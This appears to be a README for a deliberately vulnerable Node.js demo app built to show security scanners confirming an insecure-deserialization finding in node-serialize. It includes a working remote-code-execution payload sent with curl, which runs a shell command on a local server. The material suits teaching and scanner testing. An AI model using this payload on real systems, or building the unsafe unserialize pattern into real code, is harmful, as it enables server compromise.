# onevuln

Minimal educational demo: **a few vulnerabilities**, flagged by both SAST and SCA,
on the exact same code path — built to show an exploitability/reachability
scanner proving a finding is real.

## The vulnerability

[server.js](server.js) deserializes an untrusted query parameter with
`node-serialize`:

```js
const user = serialize.unserialize(req.query.data);
```

- **SAST finding**: Insecure Deserialization of untrusted input (CWE-502,
  OWASP A08:2021 – Software and Data Integrity Failures).
- **SCA finding**: `node-serialize@0.0.4` is a known-vulnerable dependency
  ([CVE-2017-5941](https://security.snyk.io/vuln/npm:node-serialize:20170208),
  CVSS 9.8) — `unserialize()` executes attacker-supplied IIFEs embedded in the
  payload.

Both tools point at the same line, because the SAST pattern (untrusted input
reaching `unserialize`) *is* the SCA CVE's exploit mechanism — one root cause,
two findings, trivially provable as reachable/exploitable.

## Run it

```bash
npm install
npm start
```

## Exploit it

```bash
curl --get --data-urlencode \
  'data={"rce":"_$$ND_FUNC$$_function(){require(\"child_process\").exec(\"id > /tmp/pwned.txt\");}()"}' \
  http://localhost:3000/profile

cat /tmp/pwned.txt   # proves arbitrary command execution
```

This runs `id` on the server and writes the output to `/tmp/pwned.txt`,
demonstrating full remote code execution via the single vulnerable line
above.
